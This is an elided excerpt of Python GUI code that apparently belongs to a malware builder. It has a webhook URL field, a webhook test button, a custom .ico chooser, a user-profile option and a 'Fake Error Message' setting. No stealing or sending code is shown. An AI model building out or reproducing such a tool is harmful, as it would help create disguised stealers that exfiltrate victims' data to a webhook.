...
try:
    ...
    url.grid(row=2, pady=(5, 25), columnspan=3, sticky="we")
    ...
    webhook_url.grid(row=3, column=0, padx=(150, 5), pady=10, sticky="we")
    ...
    test_webhook.grid(row=3, column=1, padx=(5, 150), pady=10, sticky="we")
    ...
    def ChooseIcon():
        ...
        try:
            if sys.platform.startswith("win"):
                ...
                icon_path = tk.filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
            elif sys.platform.startswith("linux"):
                icon_path = tk.filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        except:
            pass
    ...
    option_open_user_profil_settings_cb = ctk.CTkCheckBox(options_frame, text="Open UserProfile", variable=option_open_user_profil_settings_var, onvalue="Enable", offvalue="Disable", state="disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=15))
...
{red}Fake Error Message : {white + fake_error_message}""")
    ...
    print(f"""{red}Webhook   : {white + webhook[:90] + '.' * 3}
